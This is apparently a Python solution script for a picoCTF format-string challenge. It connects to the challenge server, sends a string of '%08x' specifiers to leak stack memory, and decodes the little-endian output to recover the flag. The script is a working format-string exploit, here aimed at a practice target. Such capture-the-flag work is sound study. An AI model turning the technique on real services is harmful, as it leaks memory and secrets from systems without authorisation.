import socket

HOST='mercury.picoctf.net'
PORT=53437

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((HOST, PORT))

# Get the choice selection
socket.recv(1024)
socket.recv(1024)

# Select 1) Buy some stonks!
socket.send('1'.encode('utf-8') + b'\n')

# Get the stings asking for api keys
socket.recv(1024)
socket.recv(1024)


# Send payload
print('sending payload')
socket.send('%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x'.encode('utf-8') + b'\n') # note that there should be no whitespace or scanf function will stop reading in data
# Ended up having to pad the beginning with zeros so that each 'integer' was a width of 8, just made things easier to process down the line

print('Waiting for reply')
socket.recv(1024)
data_with_flag = socket.recv(1024).decode('utf-8').split('\n')[1]

# It stores integers as little endian, so thats how it was reading it, reverse 4 bytes at a time
byte_array = []
for i in range(0, len(data_with_flag), 2):
    byte_array.append(data_with_flag[i:i+2])

final_string = ''
for i in range(0, len(byte_array), 4):
    try:
        final_string += byte_array[i+3] + byte_array[i+2] + byte_array[i+1] + byte_array[i+0]
    except:
        continue

print('The flag is somewhere in here:')
print(bytes.fromhex(final_string))